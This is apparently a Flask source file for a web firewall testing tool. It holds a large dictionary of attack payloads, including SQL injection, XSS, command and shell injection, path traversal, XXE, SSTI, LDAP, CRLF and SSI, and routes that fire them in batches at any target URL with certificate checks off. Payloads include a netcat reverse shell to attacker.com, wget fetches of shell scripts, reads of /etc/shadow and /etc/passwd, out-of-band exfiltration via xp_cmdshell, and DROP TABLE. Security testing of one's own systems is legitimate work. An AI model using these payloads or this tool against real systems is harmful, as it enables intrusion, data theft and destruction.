import time
import urllib.parse
import base64
import json
from flask import Flask, render_template, request, jsonify, Response
import requests as http_requests

app = Flask(__name__)

ATTACK_PAYLOADS = {
    "SQLi": [
        "(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\"+(select(0)from(select(sleep(15)))v)+\"*/",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1 UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "-1134')  OR JSON_EXTRACT('{\"aKER\": 9648}', '$.aKER') = 9648*7799 AND ('QlYa' LIKE 'QlYa",
        "123) AND 12=12  AND JSON_DEPTH('{}') != 2521",
        "1; DROP TABLE users--",
        "admin'--",
        "1' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1--",
        "' HAVING 1=1 --",
        "' GROUP BY columnnames having 1=1 --",
        "1 AND (SELECT COUNT(*) FROM sysobjects) > 0",
        "3;DECLARE @c varchar(255);SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @c;",
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<body onload=alert('test1')>",
        "<IMG SRC=j&#X41vascript:alert('test')>",
        "<svg onload=alert(document.domain)>",
        "<img src=x onerror=alert(document.domain)>/all",
        "'\"onwheel=alert(111)'",
        "javascript:setInterval('ale'+'rt(document.domain)')",
        "confirm.call(null,1)",
        "(alert)(1)",
        "<svg/onload=alert(1)//",
        "'\"onClick=\"(prompt)(1)'",
        "\"'>alert(1)</script><script/1='\"",
        "'\"//Onx=\"\"//onfocus=prompt(1)>'",
        "'\"Onx=() onMouSeoVer=prompt(1)>'",
        "'\"OnCliCk=\"(prompt`1`)'",
        "alert.apply(null, [1])",
        "\"autof<x>ocus o<x>nfocus=alert<x>(1)//",
        "'\"><svg onmouseover=\"confirm&#0000000040document.domain)\"",
        "'\\'\\'-alert(1)//'",
        "__proto__[v-if]=_c.constructor('alert(1)()'",
        "'&lt;svg/onload&equals;alert(1)&gt;'",
        "'\"<p only=1337 onmouseenter=window.location.href=//attacker.site>",
    ],
    "RCE": [
        "ax--exec=`id`--remote=origin",
        "; cat /et'c/pa'ss'wd",
        "cmd=127.0.0.1 && ls /etc",
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/shadow",
        "& ping -c 10 127.0.0.1 &",
        "; wget http://attacker.com/shell.sh",
        "| curl http://attacker.com/shell.sh",
    ],
    "Path Traversal": [
        "/static/img/../../etc/passwd",
        "\\\\::1\\c$\\users\\default\\ntuser.dat",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....\\\\....\\\\etc\\\\passwd",
        "/etc/passwd%00.jpg",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "Shell Injection": [
        "';wget http://some_host/sh311.sh'",
        "'|getent+hosts+somehost.burpcollaborator.net.&'",
        "';getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3482*7301));'",
        "'| set /a 3482*7301'",
        "| ls -la",
        "; nc -e /bin/sh attacker.com 4444",
        "& nslookup attacker.com &",
    ],
    "NoSQL Injection": [
        "db.injection.insert({success:1});",
        "true, $where: '99 == 88'",
        "', $or: [ {}, { 'order':'order",
        ";var date = new Date(); do{curDate = new Date();}while(curDate-date<10000)",
        "0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)",
        '{"$gt": ""}',
        '{"$ne": 1}',
        '{"$where": "sleep(5000)"}',
    ],
    "XXE": [
        '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>',
        '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>',
        '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/text.txt" > ] > <foo>&xxe;</foo>',
        '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include namespace="http://xxe-namespace.yourdomain.com/"/></xs:schema>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>',
    ],
    "SSTI": [
        '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
        "aaaa\\u0027%2b#{16*8787}%2b\\u0027bbb",
        "{{1337*1338}}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${7*7}",
        "<%= 7*7 %>",
    ],
    "LDAP Injection": [
        "(&(uid=admin)(!(&(1=0)(userPassword=q))))",
        "*(|(objectclass=*))",
        "userPassword:2.5.13.18:=123",
        "*)(&",
        "*)(uid=*))(|(uid=*",
    ],
    "CRLF": [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0a%0dSet-cookie:crlf=injection",
        "%25%30%41Set-cookie:crlf=injection",
        "%25%30%41%25%30%44Set-cookie:crlf=injection",
        "%25%30%44%25%30%41Set-cookie:crlf=injection",
        "%25%0a%0aSet-cookie:crlf=injection",
        "%e5%98%8dSet-cookie%3acrlf%3dinjection",
    ],
    "SSI": [
        '<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->',
        '<!--#exec cmd="ls" -->',
        '<!--#exec cmd="dir" -->',
        '<!--#include virtual="/etc/passwd" -->',
    ],
    "Mail Injection": [
        "\\r\\nV100 CAPABILITY\\r\\nV101 FETCH 4791",
        "\\r\\nQUIT\\r\\n",
        "\\nRCPT TO: test@evil.com\\n",
        "test@test.com\\r\\nCC: victim@example.com",
    ],
}


def encode_payload(payload, encoding):
    if encoding == "plain":
        return payload
    elif encoding == "url":
        return urllib.parse.quote(payload, safe="")
    elif encoding == "double-url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "unicode":
        return "".join(
            f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload
        )
    return payload


def classify_response(status_code, body):
    if status_code == 0:
        return "error"
    if status_code in (403, 406, 429, 493):
        return "blocked"
    if status_code >= 500:
        return "blocked"
    if body and any(
        word in body.lower()
        for word in ["blocked", "forbidden", "denied", "waf", "security", "violation", "not acceptable"]
    ):
        return "blocked"
    return "passed"


@app.route("/")
def index():
    return render_template("index.html", categories=ATTACK_PAYLOADS)


@app.route("/api/categories")
def get_categories():
    return jsonify({cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()})


@app.route("/api/test", methods=["POST"])
def run_single_test():
    data = request.get_json()
    target_url = data.get("target_url", "")
    method = data.get("method", "GET")
    payload = data.get("payload", "")
    encoding = data.get("encoding", "plain")
    injection_point = data.get("injection_point", "body-param")
    custom_headers = data.get("custom_headers", {})
    timeout = data.get("timeout", 10)

    encoded_payload = encode_payload(payload, encoding)
    headers = dict(custom_headers)
    url = target_url
    body = None

    if injection_point == "url-param":
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}test={encoded_payload}"
    elif injection_point == "url-path":
        url = url.rstrip("/") + "/" + encoded_payload
    elif injection_point == "header":
        headers["X-Test"] = encoded_payload
    elif injection_point == "cookie":
        headers["Cookie"] = f"test={encoded_payload}"
    else:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = f"test={encoded_payload}"

    start = time.time()
    try:
        if method == "GET":
            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
        else:
            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
        elapsed = int((time.time() - start) * 1000)
        resp_body = resp.text[:2000]
        status = classify_response(resp.status_code, resp_body)
        return jsonify({"http_status": resp.status_code, "time": elapsed, "status": status})
    except http_requests.exceptions.Timeout:
        elapsed = int((time.time() - start) * 1000)
        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": "timeout"})
    except Exception as e:
        elapsed = int((time.time() - start) * 1000)
        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": str(e)})


@app.route("/api/test/batch", methods=["POST"])
def run_batch_test():
    data = request.get_json()
    target_url = data.get("target_url", "")
    method = data.get("method", "GET")
    categories = data.get("categories", [])
    encodings = data.get("encodings", ["plain"])
    injection_point = data.get("injection_point", "body-param")
    custom_headers = data.get("custom_headers", {})
    delay_ms = data.get("delay", 200)
    timeout = data.get("timeout", 10)

    def generate():
        index = 0
        total = sum(
            len(ATTACK_PAYLOADS.get(cat, [])) * len(encodings)
            for cat in categories
        )
        yield json.dumps({"type": "start", "total": total}) + "\n"

        for cat in categories:
            for payload in ATTACK_PAYLOADS.get(cat, []):
                for enc in encodings:
                    index += 1
                    encoded_payload = encode_payload(payload, enc)
                    headers = dict(custom_headers)
                    url = target_url
                    body = None

                    if injection_point == "url-param":
                        sep = "&" if "?" in url else "?"
                        url = f"{url}{sep}test={encoded_payload}"
                    elif injection_point == "url-path":
                        url = url.rstrip("/") + "/" + encoded_payload
                    elif injection_point == "header":
                        headers["X-Test"] = encoded_payload
                    elif injection_point == "cookie":
                        headers["Cookie"] = f"test={encoded_payload}"
                    else:
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        body = f"test={encoded_payload}"

                    start = time.time()
                    try:
                        if method == "GET":
                            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
                        else:
                            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
                        elapsed = int((time.time() - start) * 1000)
                        resp_body = resp.text[:2000]
                        status = classify_response(resp.status_code, resp_body)
                        result = {
                            "type": "result",
                            "index": index,
                            "category": cat,
                            "payload": payload,
                            "encoding": enc,
                            "status": status,
                            "http_status": resp.status_code,
                            "time": elapsed,
                        }
                    except Exception as e:
                        elapsed = int((time.time() - start) * 1000)
                        result = {
                            "type": "result",
                            "index": index,
                            "category": cat,
                            "payload": payload,
                            "encoding": enc,
                            "status": "error",
                            "http_status": 0,
                            "time": elapsed,
                        }

                    yield json.dumps(result) + "\n"

                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

        yield json.dumps({"type": "done"}) + "\n"

    return Response(generate(), mimetype="application/x-ndjson")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    app.run(host="0.0.0.0", port=5000, debug=True)
